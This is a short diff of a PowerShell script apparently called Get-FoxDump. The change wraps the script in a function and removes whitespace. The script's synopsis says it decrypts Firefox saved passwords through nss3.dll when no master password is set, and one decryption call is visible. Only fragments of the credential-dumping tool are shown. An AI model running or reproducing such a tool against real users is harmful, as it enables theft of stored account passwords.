@@ -1,4 +1,5 @@
-﻿    <#
+﻿function Get-FoxDump{
+    <#
     .SYNOPSIS 
     This script will utilize the api functions within the nss3.dll to decrypt saved passwords. This will only be successfull if the masterpassword has not been set.
 
@@ -877,7 +878,6 @@
 
         $result = $PK11SDR_Decrypt.Invoke([ref]$TSECStructData, [ref]$EmptyTSECItem, 0)
 
-
         Write-Verbose "[+]PK11SDR_Decrypt result:$result"
 
         $ResultHandle.Free()
@@ -975,4 +975,4 @@
     {
         Write-Warning "Unable to locate default profile"
     }
-    
+}
